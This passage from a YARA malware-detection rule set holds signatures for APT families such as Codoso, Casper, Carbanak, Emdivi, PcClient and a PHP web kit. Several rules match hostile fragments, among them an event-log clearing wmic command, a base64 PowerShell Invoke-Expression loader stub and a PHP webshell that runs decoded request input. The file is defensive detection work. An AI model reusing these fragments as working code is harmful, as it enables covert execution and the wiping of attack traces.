$s5 = "McInitMISPAlertEx" fullword ascii
$s6 = "sc start %%1" fullword ascii
$s7 = "B_WKNDNSK^" fullword ascii
$s8 = "net stop %%1" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 406KB and all of them
}
rule SSC_Codoso_Gh0st_1
{
meta:
description = "Detects Codoso APT Gh0st Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841"
hash2 = "7dc7cec2c3f7e56499175691f64060ebd955813002d4db780e68a8f6e7d0a8f8"
hash3 = "d7004910a87c90ade7e5ff6169f2b866ece667d2feebed6f0ec856fb838d2297"
strings:
$x1 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii
$x2 = "rundll32.exe \"%s\", RunMeByDLL32" fullword ascii
$x3 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" fullword wide
$x4 = "\\\\.\\keymmdrv1" fullword ascii
$s1 = "spideragent.exe" fullword ascii
$s2 = "AVGIDSAgent.exe" fullword ascii
$s3 = "kavsvc.exe" fullword ascii
$s4 = "mspaint.exe" fullword ascii
$s5 = "kav.exe" fullword ascii
$s6 = "avp.exe" fullword ascii
$s7 = "NAV.exe" fullword ascii
$c1 = "Elevation:Administrator!new:" wide
$c2 = "Global\\RUNDLL32EXITEVENT_NAME{12845-8654-543}" fullword ascii
$c3 = "\\sysprep\\sysprep.exe" fullword wide
$c4 = "\\sysprep\\CRYPTBASE.dll" fullword wide
$c5 = "Global\\TERMINATEEVENT_NAME{12845-8654-542}" fullword ascii
$c6 = "ConsentPromptBehaviorAdmin" fullword ascii
$c7 = "\\sysprep" fullword wide
$c8 = "Global\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and ( 4 of ($s*) or 4 of ($c*) ) or 1 of ($x*) or 6 of ($c*)
}
rule SSC_Codoso_PGV_PVID_3
{
meta:
description = "Detects Codoso APT PGV PVID Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "126fbdcfed1dfb31865d4b18db2fb963f49df838bf66922fea0c37e06666aee1"
hash2 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
hash3 = "8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761"
hash4 = "b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1"
hash5 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
hash6 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
strings:
$x1 = "Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012" fullword wide
condition:
$x1
}
rule SSC_Codoso_Gh0st_2
{
meta:
description = "Detects Codoso APT Gh0st Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841"
strings:
$s0 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii
$s1 = "rundll32.exe \"%s\", RunMeByDLL32" fullword ascii
$s13 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" fullword wide
$s14 = "%s -r debug 1" fullword ascii
$s15 = "\\\\.\\keymmdrv1" fullword ascii
$s17 = "RunMeByDLL32" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 500KB and 1 of them
}
rule SSC_Codoso_PlugX_2
{
meta:
description = "Detects Codoso APT PlugX Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "b9510e4484fa7e3034228337768176fce822162ad819539c6ca3631deac043eb"
strings:
$s1 = "%TEMP%\\HID" fullword wide
$s2 = "%s\\hid.dll" fullword wide
$s3 = "%s\\SOUNDMAN.exe" fullword wide
$s4 = "\"%s\\SOUNDMAN.exe\" %d %d" fullword wide
$s5 = "%s\\HID.dllx" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them ) or all of them
}
rule SSC_Codoso_CustomTCP_4
{
meta:
description = "Detects Codoso APT CustomTCP Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash1 = "ea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0"
hash2 = "130abb54112dd47284fdb169ff276f61f2b69d80ac0a9eac52200506f147b5f8"
hash3 = "3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa"
hash4 = "02cf5c244aebaca6195f45029c1e37b22495609be7bdfcfcd79b0c91eac44a13"
strings:
$x1 = "varus_service_x86.dll" fullword ascii
$s1 = "/s %s /p %d /st %d /rt %d" fullword ascii
$s2 = "net start %%1" fullword ascii
$s3 = "ping 127.1 > nul" fullword ascii
$s4 = "McInitMISPAlertEx" fullword ascii
$s5 = "sc start %%1" fullword ascii
$s6 = "net stop %%1" fullword ascii
$s7 = "WorkerRun" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 5 of them ) or ( $x1 and 2 of ($s*) )
}
rule SSC_Codoso_PGV_PVID_2
{
meta:
description = "Detects Codoso APT PGV PVID Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
super_rule = 1
hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
hash2 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
hash3 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
strings:
$s0 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
$s1 = "regsvr32.exe /s \"%s\"" fullword ascii
$s2 = "Help and Support" fullword ascii
$s3 = "netsvcs" fullword ascii
$s9 = "%SystemRoot%\\System32\\svchost.exe -k netsvcs" fullword ascii /* Goodware String - occured 4 times */
$s10 = "winlogon" fullword ascii /* Goodware String - occured 4 times */
$s11 = "System\\CurrentControlSet\\Services" fullword ascii /* Goodware String - occured 11 times */
condition:
uint16(0) == 0x5a4d and filesize < 907KB and all of them
}
rule SSC_Codoso_Gh0st_3
{
meta:
description = "Detects Codoso APT Gh0st Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "bf52ca4d4077ae7e840cf6cd11fdec0bb5be890ddd5687af5cfa581c8c015fcd"
strings:
$x1 = "RunMeByDLL32" fullword ascii
$s1 = "svchost.dll" fullword wide
$s2 = "server.dll" fullword ascii
$s3 = "Copyright ? 2008" fullword wide
$s4 = "testsupdate33" fullword ascii
$s5 = "Device Protect Application" fullword wide
$s6 = "MSVCP60.DLL" fullword ascii /* Goodware String - occured 1 times */
$s7 = "mail-news.eicp.net" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 195KB and $x1 or 4 of them
}
rule SSC_Codoso_CustomTCP_3
{
meta:
description = "Detects Codoso APT CustomTCP Malware"
author = "Florian Roth"
reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
date = "2016-01-30"
hash = "d66106ec2e743dae1d71b60a602ca713b93077f56a47045f4fc9143aa3957090"
strings:
$s1 = "DnsApi.dll" fullword ascii
$s2 = "softWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\%s" ascii
$s3 = "CONNECT %s:%d hTTP/1.1" ascii
$s4 = "CONNECT %s:%d HTTp/1.1" ascii
$s5 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)" ascii
$s6 = "iphlpapi.dll" ascii
$s7 = "%systemroot%\\Web\\" ascii
$s8 = "Proxy-Authorization: Negotiate %s" ascii
$s9 = "CLSID\\{%s}\\InprocServer32" ascii
condition:
( uint16(0) == 0x5a4d and filesize < 500KB and 5 of them ) or 7 of them
}
rule SSC_Casper_Backdoor_x86
{
meta:
description = "Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo"
author = "Florian Roth"
reference = "http://goo.gl/VRJNLo"
date = "2015/03/05"
hash = "f4c39eddef1c7d99283c7303c1835e99d8e498b0"
score = 80
strings:
$s1 = "\"svchost.exe\"" fullword wide
$s2 = "firefox.exe" fullword ascii
$s3 = "\"Host Process for Windows Services\"" fullword wide
$x1 = "\\Users\\*" fullword ascii
$x2 = "\\Roaming\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
$x3 = "\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
$x4 = "\\Documents and Settings\\*" fullword ascii
$y1 = "%s; %S=%S" fullword wide
$y2 = "%s; %s=%s" fullword ascii
$y3 = "Cookie: %s=%s" fullword ascii
$y4 = "http://%S:%d" fullword wide
$z1 = "http://google.com/" fullword ascii
$z2 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)" fullword ascii
$z3 = "Operating System\"" fullword wide
condition:
( all of ($s*) ) or ( 3 of ($x*) and 2 of ($y*) and 2 of ($z*) )
}
rule SSC_Casper_SystemInformation_Output
{
meta:
description = "Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo"
author = "Florian Roth"
reference = "http://goo.gl/VRJNLo"
date = "2015/03/06"
score = 70
strings:
$a0 = "***** SYSTEM INFORMATION ******"
$a1 = "***** SECURITY INFORMATION ******"
$a2 = "Antivirus: "
$a3 = "Firewall: "
$a4 = "***** EXECUTION CONTEXT ******"
$a5 = "Identity: "
$a6 = "<CONFIG TIMESTAMP="
condition:
all of them
}
rule SSC_Casper_EXE_Dropper
{
meta:
description = "Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo"
author = "Florian Roth"
reference = "http://goo.gl/VRJNLo"
date = "2015/03/05"
hash = "e4cc35792a48123e71a2c7b6aa904006343a157a"
score = 80
strings:
$s0 = "<Command>" fullword ascii
$s1 = "</Command>" fullword ascii
$s2 = "\" /d \"" fullword ascii
$s4 = "'%s' %s" fullword ascii
$s5 = "nKERNEL32.DLL" fullword wide
$s6 = "@ReturnValue" fullword wide
$s7 = "ID: 0x%x" fullword ascii
$s8 = "Name: %S" fullword ascii
condition:
7 of them
}
rule SSC_Casper_Included_Strings
{
meta:
description = "Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo"
author = "Florian Roth"
reference = "http://goo.gl/VRJNLo"
date = "2015/03/06"
score = 50
strings:
$a0 = "cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST"
$a1 = "& SYSTEMINFO) ELSE EXIT"
$mz = { 4d 5a }
$c1 = "domcommon.exe" wide fullword                         // File Name
$c2 = "jpic.gov.sy" fullword                                // C2 Server
$c3 = "aiomgr.exe" wide fullword                            // File Name
$c4 = "perfaudio.dat" fullword                              // Temp File Name
$c5 = "Casper_DLL.dll" fullword                             // Name
$c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 }   // Decryption Key
$c7 = "{4216567A-4512-9825-7745F856}" fullword              // Mutex
condition:
all of ($a*) or ( $mz at 0 ) and ( 1 of ($c*) )
}
rule SSC_Carbanak_0915_1
{
meta:
description = "Carbanak Malware"
author = "Florian Roth"
reference = "https://www.csis.dk/en/csis/blog/4710/"
date = "2015-09-03"
score = 70
strings:
$s1 = "evict1.pdb" fullword ascii
$s2 = "http://testing.corp 0" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}
rule SSC_Carbanak_0915_3
{
meta:
description = "Carbanak Malware"
author = "Florian Roth"
reference = "https://www.csis.dk/en/csis/blog/4710/"
date = "2015-09-03"
score = 70
strings:
$s1 = "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww" fullword ascii
$s2 = "SHInvokePrinterCommandA" fullword ascii
$s3 = "Ycwxnkaj" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 700KB and all of them
}
rule SSC_Carbanak_0915_2
{
meta:
description = "Carbanak Malware"
author = "Florian Roth"
reference = "https://www.csis.dk/en/csis/blog/4710/"
date = "2015-09-03"
score = 70
strings:
$x1 = "8Rkzy.exe" fullword wide
$s1 = "Export Template" fullword wide
$s2 = "Session folder with name '%s' already exists." fullword ascii
$s3 = "Show Unconnected Endpoints (Ctrl+U)" fullword ascii
$s4 = "Close All Documents" fullword wide
$s5 = "Add &Resource" fullword ascii
$s6 = "PROCEXPLORER" fullword wide /* Goodware String - occured 1 times */
$s7 = "AssocQueryKeyA" fullword ascii /* Goodware String - occured 4 times */
condition:
uint16(0) == 0x5a4d and filesize < 500KB and ( $x1 or all of ($s*) )
}
rule SSC_apt_c16_win64_dropper
{
meta:
author = "@dragonthreatlab"
date = "2015/01/11"
description = "APT malware used to drop PcClient RAT"
reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
strings:
$mz = { 4D 5A }
$str1 = "clbcaiq.dll" ascii
$str2 = "profapi_104" ascii
$str3 = "\\Microsoft\\wuauclt\\wuauclt.dat" ascii
$str4 = { 0F B6 0A 48 FF C2 80 E9 03 80 F1 03 49 FF C8 88 4A FF 75 EC }
condition:
$mz at 0 and all of ($str*)
}
rule SSC_apt_c16_win_swisyn
{
meta:
author = "@dragonthreatlab"
md5 = "a6a18c846e5179259eba9de238f67e41"
description = "File matching the md5 above tends to only live in memory, hence the lack of MZ header check."
date = "2015/01/11"
reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
strings:
$mz = {4D 5A}
$str1 = "/ShowWU" ascii
$str2 = "IsWow64Process"
$str3 = "regsvr32 "
$str4 = {8A 11 2A 55 FC 8B 45 08 88 10 8B 4D 08 8A 11 32 55 FC 8B 45 08 88 10}
condition:
$mz at 0 and all of ($str*)
}
rule SSC_apt_c16_win_memory_pcclient
{
meta:
author = "@dragonthreatlab"
md5 = "ec532bbe9d0882d403473102e9724557"
description = "File matching the md5 above tends to only live in memory, hence the lack of MZ header check."
date = "2015/01/11"
reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
strings:
$str1 = "Kill You" ascii
$str2 = "%4d-%02d-%02d %02d:%02d:%02d" ascii
$str3 = "%4.2f  KB" ascii
$encodefunc = {8A 08 32 CA 02 CA 88 08 40 4E 75 F4}
condition:
all of them
}
rule SSC_apt_c16_win_wateringhole
{
meta:
author = "@dragonthreatlab"
description = "Detects code from APT wateringhole"
date = "2015/01/11"
reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
strings:
$str1 = "function runmumaa()"
$str2 = "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("
$str3 = "function MoSaklgEs7(k)"
condition:
any of ($str*)
}
rule SSC_apt_c16_win32_dropper
{
meta:
author = "@dragonthreatlab"
md5 = "ad17eff26994df824be36db246c8fb6a"
description = "APT malware used to drop PcClient RAT"
date = "2015/01/11"
reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
strings:
$mz = {4D 5A}
$str1 = "clbcaiq.dll" ascii
$str2 = "profapi_104" ascii
$str3 = "/ShowWU" ascii
$str4 = "Software\\Microsoft\\Windows\\CurrentVersion\\" ascii
$str5 = {8A 08 2A CA 32 CA 88 08 40 4E 75 F4 5E}
condition:
$mz at 0 and all of ($str*)
}
rule SSC_apt_c16_win_disk_pcclient
{
meta:
author = "@dragonthreatlab"
md5 = "55f84d88d84c221437cd23cdbc541d2e"
description = "Encoded version of pcclient found on disk"
date = "2015/01/11"
reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
strings:
$header = {51 5C 96 06 03 06 06 06 0A 06 06 06 FF FF 06 06 BE 06 06 06 06 06 06 06 46 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 EE 06 06 06 10 1F BC 10 06 BA 0D D1 25 BE 05 52 D1 25 5A 6E 6D 73 26 76 74 6F 67 74 65 71 26 63 65 70 70 6F 7A 26 64 69 26 74 79 70 26 6D 70 26 4A 4F 53 26 71 6F 6A 69 30 11 11 0C 2A 06 06 06 06 06 06 06 73 43 96 1B 37 24 00 4E 37 24 00 4E 37 24 00 4E BA 40 F6 4E 39 24 00 4E 5E 41 FA 4E 33 24 00 4E 5E 41 FC 4E 39 24 00 4E 37 24 FF 4E 0D 24 00 4E FA 31 A3 4E 40 24 00 4E DF 41 F9 4E 36 24 00 4E F6 2A FE 4E 38 24 00 4E DF 41 FC 4E 38 24 00 4E 54 6D 63 6E 37 24 00 4E 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 56 49 06 06 52 05 09 06 5D 87 8C 5A 06 06 06 06 06 06 06 06 E6 06 10 25 0B 05 08 06 06 1C 06 06 06 1A 06 06 06 06 06 06 E5 27 06 06 06 16 06 06 06 36 06 06 06 06 06 16 06 16 06 06 06 04 06 06 0A 06 06 06 06 06 06 06 0A 06 06 06 06 06 06 06 06 76 06 06 06 0A 06 06 06 06 06 06 04 06 06 06 06 06 16 06 06 16 06 06}
condition:
$header at 0
}
rule SSC_Emdivi_Gen3
{
meta:
description = "Detects Emdivi Malware"
author = "Florian Roth @Cyber0ps"
reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
date = "2015-08-20"
super_rule = 1
score = 80
hash1 = "008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e"
hash2 = "a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d"
strings:
$x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)" fullword ascii
$s2 = "\\Mozilla\\Firefox\\Profiles\\" fullword ascii
$s4 = "\\auto.cfg" fullword ascii
$s5 = "/ncsi.txt" fullword ascii
$s6 = "/en-us/default.aspx" fullword ascii
$s7 = "cmd /c" fullword ascii
$s9 = "APPDATA" fullword ascii /* Goodware String - occured 25 times */
condition:
uint16(0) == 0x5a4d and filesize < 850KB and (( $x1 and 1 of ($s*)) or ( 4 of ($s*)))
}
rule SSC_Emdivi_Gen2
{
meta:
description = "Detects Emdivi Malware"
author = "Florian Roth @Cyber0ps"
reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
date = "2015-08-20"
super_rule = 1
score = 80
hash1 = "9a351885bf5f6fec466f30021088504d96e9db10309622ed198184294717add1"
hash2 = "a5be7cb1f37030c9f9211c71e0fbe01dae19ff0e6560c5aab393621f18a7d012"
hash3 = "9183abb9b639699cd2ad28d375febe1f34c14679b7638d1a79edb49d920524a4"
strings:
$s1 = "%TEMP%\\IELogs\\" fullword ascii
$s2 = "MSPUB.EXE" fullword ascii
$s3 = "%temp%\\" fullword ascii
$s4 = "\\NOTEPAD.EXE" fullword ascii
$s5 = "%4d-%02d-%02d %02d:%02d:%02d " fullword ascii
$s6 = "INTERNET_OPEN_TYPE_PRECONFIG" fullword ascii
$s7 = "%4d%02d%02d%02d%02d%02d" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1300KB and 6 of them
}
rule SSC_Emdivi_Gen1
{
meta:
description = "Detects Emdivi Malware"
author = "Florian Roth @Cyber0ps"
reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
date = "2015-08-20"
score = 80
super_rule = 1
hash1 = "17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24"
hash2 = "3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1"
hash3 = "6a331c4e654dd8ddaa2c69d260aa5f4f76f243df8b5019d62d4db5ae5c965662"
hash4 = "90d07ea2bb80ed52b007f57d0d9a79430cd50174825c43d5746a16ee4f94ea86"
strings:
$x1 = "wmic nteventlog where filename=\"SecEvent\" call cleareventlog" fullword wide
$s0 = "del %Temp%\\*.exe %Temp%\\*.dll %Temp%\\*.bat %Temp%\\*.ps1 %Temp%\\*.cmd /f /q" fullword wide
$x3 = "userControl-v80.exe" fullword ascii
$s1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)" fullword wide
$s2 = "http://www.msftncsi.com" fullword wide
$s3 = "net use | find /i \"c$\"" fullword wide
$s4 = " /del /y & " fullword wide
$s5 = "\\auto.cfg" fullword wide
$s6 = "/ncsi.txt" fullword wide
$s7 = "Dcmd /c" fullword wide
$s8 = "/PROXY" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 800KB and all of them
}
rule SSC_Emdivi_Gen4
{
meta:
description = "Detects Emdivi Malware"
author = "Florian Roth @Cyber0ps"
reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
date = "2015-08-20"
super_rule = 1
score = 80
hash1 = "008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e"
hash2 = "17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24"
hash3 = "3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1"
hash4 = "6a331c4e654dd8ddaa2c69d260aa5f4f76f243df8b5019d62d4db5ae5c965662"
hash5 = "90d07ea2bb80ed52b007f57d0d9a79430cd50174825c43d5746a16ee4f94ea86"
hash6 = "a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d"
strings:
$s1 = ".http_port\", " fullword wide
$s2 = "UserAgent: " fullword ascii
$s3 = "AUTH FAILED" fullword ascii
$s4 = "INVALID FILE PATH" fullword ascii
$s5 = ".autoconfig_url\", \"" fullword wide
$s6 = "FAILED TO WRITE FILE" fullword ascii
$s7 = ".proxy" fullword wide
$s8 = "AuthType: " fullword ascii
$s9 = ".no_proxies_on\", \"" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 853KB and all of them
}
rule SSC_Emdivi_SFX
{
meta:
description = "Detects Emdivi malware in SFX Archive"
author = "Florian Roth @Cyber0ps"
reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
date = "2015-08-20"
score = 70
hash1 = "7a3c81b2b3c14b9cd913692347019887b607c54152b348d6d3ccd3ecfd406196"
hash2 = "8c3df4e4549db3ce57fc1f7b1b2dfeedb7ba079f654861ca0b608cbfa1df0f6b"
strings:
$x1 = "Setup=unsecess.exe" fullword ascii
$x2 = "Setup=leassnp.exe" fullword ascii
$s1 = "&Enter password for the encrypted file:" fullword wide
$s2 = ";The comment below contains SFX script commands" fullword ascii
$s3 = "Path=%temp%" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 740KB and (1 of ($x*) and all of ($s*))
}
rule SSC_apt_backspace
{
meta:
description = "Detects APT backspace"
author = "Bit Byte Bitten"
date = "2015-05-14"
hash = "6cbfeb7526de65eb2e3c848acac05da1e885636d17c1c45c62ad37e44cd84f99"
strings:
$s1 = "!! Use Splice Socket !!"
$s2 = "User-Agent: SJZJ (compatible; MSIE 6.0; Win32)"
$s3 = "g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d"
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_WebShell_PHP_Web_Kit_v4
{
meta:
description = "Detects PAS Tool PHP Web Kit"
reference = "https://github.com/wordfence/grizzly"
author = "Florian Roth"
date = "2016/01/01"
strings:
$php = "<?php $"
$s1 = "(StR_ReplAcE(\"\\n\",'',"
$s2 = ";if(PHP_VERSION<'5'){" ascii
$s3 = "=SuBstr_rePlACe(" ascii
condition:
$php at 0 and filesize > 8KB and filesize < 100KB and 2 of ($s*)
}
rule SSC_GRIZZLY_STEPPE_Malware_2
{
meta:
description = "Auto-generated rule - file 9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0"
author = "Florian Roth"
reference = "https://goo.gl/WVflzO"
date = "2016-12-29"
hash1 = "9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0"
hash2 = "55058d3427ce932d8efcbe54dccf97c9a8d1e85c767814e34f4b2b6a6b305641"
strings:
$x1 = "GoogleCrashReport.dll" fullword ascii
$s1 = "CrashErrors" fullword ascii
$s2 = "CrashSend" fullword ascii
$s3 = "CrashAddData" fullword ascii
$s4 = "CrashCleanup" fullword ascii
$s5 = "CrashInit" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and $x1 ) or ( all of them )
}
rule SSC_PAS_TOOL_PHP_WEB_KIT_mod
{
meta:
description = "Detects PAS Tool PHP Web Kit"
reference = "https://www.us-cert.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity"
author = "US CERT - modified by Florian Roth due to performance reasons"
date = "2016/12/29"
strings:
$php = "<?php"
$base64decode1 = "='base'.("
$strreplace = "str_replace(\"\\n\", ''"
$md5 = ".substr(md5(strrev("
$gzinflate = "gzinflate"
$cookie = "_COOKIE"
$isset = "isset"
condition:
$php at 0 and (filesize > 10KB and filesize < 30KB) and #cookie == 2 and #isset == 3 and all of them
}
rule SSC_WebShell_PHP_Web_Kit_v3
{
meta:
description = "Detects PAS Tool PHP Web Kit"
reference = "https://github.com/wordfence/grizzly"
author = "Florian Roth"
date = "2016/01/01"
strings:
$php = "<?php $"
$php2 = "@assert(base64_decode($_REQUEST["
$s1 = "(str_replace(\"\\n\", '', '"
$s2 = "(strrev($" ascii
$s3 = "de'.'code';" ascii
condition:
( $php at 0 or $php2 ) and filesize > 8KB and filesize < 100KB and all of ($s*)
}
rule SSC_callTogether_certificate
{
meta:
author = "Fireeye Labs"
version = "1.0"
reference_hash = "d08e038d318b94764d199d7a85047637"
description = "detects binaries signed with the CallTogether certificate"
strings:
$serial = {452156C3B3FB0176365BDB5B7715BC4C}
$o = "CallTogether, Inc."
condition:
$serial and $o
}
rule SSC_qti_certificate
{
meta:
author = "Fireeye Labs"
reference_hash = "cfa3e3471430a0096a4e7ea2e3da6195"
description = "detects binaries signed with the QTI International Inc certificate"
strings:
$cn = "QTI International Inc"
$serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }
condition:
$cn and $serial
}
rule SSC_Tendrit_2014 : OnePHP
{
meta:
author = "PwC Cyber Threat Operations   :: @tlansec"
date="2014-12"
ref="[http://pwc.blogs.com/cyber_security_updates/2014/12/festive-spearphishing-merry-christmas-from-an-apt-actor.html]"
hash = "7b83a7cc1afae7d8b09483e36bc8dfbb"
strings:
$url1="favicon"
$url2="policyref"
$url3="css.ashx"
$url4="gsh.js"
$url5="direct"
$error1="Open HOST_URL error"
$error2="UEDone"
$error3="InternetOpen error"
$error4="Create process fail"
$error5="cmdshell closed"
$error6="invalid command"
$error7="mget over&bingle"
$error8="mget over&fail"
condition:
(all of ($url*) or all of ($error*)) and filesize < 300KB
}
rule SSC_wipbot_2013_core_PDF {
strings:
$PDF = "%PDF-"
$a = /\+[A-Za-z]{1}\. _ _ \$\+[A-Za-z]{1}\. _ \$ _ \+/
$b = /\+[A-Za-z]{1}\.\$\$\$ _ \+/
condition:
($PDF at 0) and #a > 150 and #b > 200
}
rule SSC_wipbot_2013_dll {
meta:
description = "Down.dll component"
strings:
$string1 = "/%s?rank=%s"
$string2 = "ModuleStart\x00ModuleStop\x00start"
$string3 = "1156fd22-3443-4344-c4ffff"
//read file... error..
$string4 = "read\x20file\x2E\x2E\x2E\x20error\x00\x00"
condition:
2 of them
}
rule SSC_turla_dropper {
strings:
$a = {0F 31 14 31 20 31 3C 31 85 31 8C 31 A8 31 B1 31
D1 31 8B 32 91 32 B6 32 C4 32 6C 33 AC 33 10 34}
$b = {48 41 4C 2E 64 6C 6C 00 6E 74 64 6C 6C 2E 64 6C
6C 00 00 00 57 8B F9 8B 0D ?? ?? ?? ?? ?? C9 75
26 56 0F 20 C6 8B C6 25 FF FF FE FF 0F 22 C0 E8}
condition:
all of them
}
rule SSC_sav {
strings:
$mz = "MZ"
/*
8B 75 18 mov esi, [ebp+arg _ 10]
31 34 81 xor [ecx+eax*4], esi
40 inc eax
3B C2 cmp eax, edx
72 F5 jb short loc _ 9F342
33 F6 xor esi, esi
39 7D 14 cmp [ebp+arg _ C], edi
76 1B jbe short loc _ 9F36F
8A 04 0E mov al, [esi+ecx]
88 04 0F mov [edi+ecx], al
6A 0F push 0Fh
33 D2 xor edx, edx
8B C7 mov eax, edi
5B pop ebx
F7 F3 div ebx
85 D2 test edx, edx
75 01 jnz short loc _ 9F368
*/
$code1a = { 8B 75 18 31 34 81 40 3B C2 72 F5 33 F6
39 7D 14 76 1B 8A 04 0E 88 04 0F 6A 0F 33 D2 8B C7
5B F7 F3 85 D2 75 01 }
/*
8B 45 F8 mov eax, [ebp+var _ 8]
40 inc eax
